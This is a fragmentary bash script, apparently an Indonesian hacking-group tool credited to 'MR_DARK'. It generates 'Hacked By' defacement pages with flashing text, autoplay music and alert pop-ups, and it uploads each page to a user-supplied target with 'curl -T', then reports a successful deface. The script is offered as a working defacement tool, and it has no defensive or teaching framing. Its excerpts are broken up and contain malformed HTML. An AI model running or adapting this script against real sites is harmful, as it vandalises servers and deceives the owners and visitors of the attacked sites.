...
echo -e '[#]\e[1;31m6 \e[0;36mscript all team MR_DARK'
echo '[][][][][][][][]][][][][][][][][][][][][][][][][][][][][]'
echo ''
...
<meta content='Hacked By $user ? ' name='description'/>
<meta content='Hacked By $user ?, Hacked by $user Hacked by $user name='keywords'/>
<meta content='Hacked By $user ?, Hacked by $user Hacked by $user name='Abstract'/>
...
<h1 id="h1">Owned By $user</h1><br>
</br>
<h2 id="h2">PESAN UNTUK ANDA!</h2> 
<h3 id="h3">$pesan1</h3>
<h4 id="h4"><br></h4>
...
<font color="#ff0000" face="Tahoma" size="3">   - $user - DARK NETWORK SECURITY Center - MR_DARK AND $user </font></marquee><br></p><p align="center">
</div>
</div>
...
<p><br><br><br><br><center></b><font size="3,5"<font color="white">Hacked BY <br><br><span class="blink_me"><font size="4" color="Red" face="Wallpoet" style="text-shadow: 5px 0px 30px red;">$user1</font></center></span><br><br><center><font size="1" color="grey" face="Iceberg"> </font><font size="3"<color="red" face="Iceberg">MR_DARK THE BEST CHANNEL HACKING</span></font> <font size="1" color="grey" face="Iceberg"> <span style="color:white;" id="12"></span></font></center> 
...
<br>
<font face="iceberg" size="2px" color="red">PESAN |
    <font size="2px" color="white" face="Iceberg">$pesan2</font><br>
 ...
 <br><span class="blink_me"><font size="3" color="Red" face="Wallpoet" style="text-shadow: 5px 0px 27px red;">Powered By TEAM DARK NETWORK SECURITY <br><a href="https://www.youtube.com/channel/UClLROKaOhSoO0dSGGT2J_Ew">COPYRIGHT BY MR_DARK<br></span></center>
<center>
<audio autoplay="autoplay" controls="controls" src="https://i.top4top.io/m_16036g6f61.mp3" type="audio/mpeg"></audio>
</center>
<center>
...
tolol
curl -T /$HOME/index.html $target1
...
read -p $'\e[32mpesan ketiga  :\e[0m ' pesanC
read -p $'\e[32mpesanD  :\e[0m ' pesanD
cd $HOME
rm index.html
cat <<lol>index.html
<!doctypehtml>
...
read -p $'\e[32mpesanD  :\e[0m ' pesanj
cd $HOME
rm index.html
cat <<ha>index.html
<html>
...
ha
curl -T /$HOME/index.html $target3
echo 'Berhasil Men Deface'
fi
if [ $pill = 5 ]
then
...
cd $HOME
rm index.html
cat <<text_javascript>index.html
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Hacked by $user4</title>
...
<body>
  ...
  <canvas id="demo-canvas"></canvas>
    <h1 class="main-title">Hacked By $user4<br><span class="thin">DARK NET</span></h1>
</div>
...
text_javascript
curl -T /$HOME/index.html $target4
echo 'DONE'
fi
if [ $pill = 6 ]
then
...
rm index.html
cat <<nano>index.html
<html>  <head>   <link rel="shortcut icon" href="http://i.imgur.com/6nDDWzt.png" />   <meta property="og:title" content="Extreme Crew"/>   <meta property="og:description" content="Hacked By $user5"/>   <title>HACK BY $user5</title>   <link href='http://fonts.googleapis.com/css?family=Megrim' rel='stylesheet' type='text/css'>   <link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>     <script src="http://e-mete.com/js/kdsnow.js"></script>  <style>    body{     background-image: url(index.html);     background-repeat: no-repeat;      background-attachment: fixed;      background-position: top;     background-color:#000000;     position: relative;     background-size:100% 100vh;          }    .logo {     width: 300px;     height: 300px;     margin: 0 auto;     margin-top: 50px;     -webkit-filter: drop-shadow(0px 0px 7px #0080FF);     filter: drop-shadow(0px 0px 7px #0080FF);    }    .logo:hover{     width: 300px;     height: 300px;     -webkit-filter: drop-shadow(0px 0px 10px #0080FF);     opacity:0.4;     filter:alpha(opacity=40);     transition: opacity .2s ease-out;     -moz-transition: opacity .2s ease-out;     -webkit-transition: opacity .2s ease-out;     -o-transition: opacity .2s ease-out;    }    .defacedby{     font-family: Megrim;     text-align: center;     color: black;     font-weight: bold;     font-size: 50px;   text-shadow: #0080FF 1px 2px 1px;        }    .glow {     font-family: Quicksand;     text-align: center;     color: grey;     font-style: bold;     font-size: 15px;    margin-top: 16px;    text-shadow: black 1px 2px 1px;        }    .greetings{     font-family: Quicksand;     text-align: center;     color: #ffffff;     font-size: 15px;     margin-top: 50px; text-shadow: black 1px 2px 1px;    }    </style>   </head>    <body>   <script>    alert('$user5 Was Here!')   </script>   <center>
    <img src="http://zonehmirrors.org/defaced/2016/12/07/abklimhamn.se/i.imgur.com/6nDDWzt.png" class="logo"></img><br>   </center>
</div>
<div class="glow">
    <h2>
<b><font color=red>"Hacked B<font color=white>y $user5" <b></h2>
<audio src="https://i.top4top.io/m_16036g6f61.mp3" autoplay="true" loop="true"></audio>
<font color=cyan>$pes<br><br>We are : <br>-DH1Y4-MR_DARK-ANONIM-$user5-petrick_exploiter-xDARK-Mr_Error-jackel<br> -DH1Y4-MR_DARK-ANONIM-$user5-petrick_exploiter-xDARK-Mr_Error-jackel-MR-404-HAX0R <br> </div>
<div class="greetings">
   <b><font color=white>Greetz To :<br>$user5 and MR_DARK<br><br>Contact: CHANNEL (MR_DARK)   </footer>     </div>
